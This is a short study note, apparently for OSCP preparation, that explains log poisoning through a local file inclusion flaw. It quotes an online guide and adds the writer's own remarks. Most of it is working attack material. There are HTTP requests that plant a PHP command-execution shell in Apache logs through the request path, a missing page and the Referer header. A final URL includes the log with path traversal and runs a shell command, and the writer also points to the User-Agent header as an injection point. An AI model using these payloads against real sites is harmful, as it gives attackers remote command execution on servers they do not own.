
Log poisoning

There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log

<<So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.>>

GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close

You can also add it to the error-log by making a request to a page that doesn't exists
GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close

Or in the referer parameter. (my notes: in this case, it would be in the success.log?)
GET / HTTP/1.1
Referer: <? passthru($_GET[cmd]) ?>
Host: 192.168.1.159
Connection: close

Now you can request the log-file through the LFI and see the php-code get executed. 
http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id

SOURCE: https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html#log-poisoning
-----------------------------------------------------------------------------------------------------------------------------------------

In other words, you need:
1 -> to be able to access the .log file. In this moment, you will see the elements that is saved there, to choose where you will try to inject the php command.

Ex: 
165.22.117.21 - 200 "GET /static/images/youtube.svg HTTP/1.1" "http://165.22.117.21:30988/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" 
Here, from the user side, it is shown the User Agent (Mozilla/5.0...). So, you could try to insert your payload in this header.

2 -> to be able to inject a php command in the .log file.







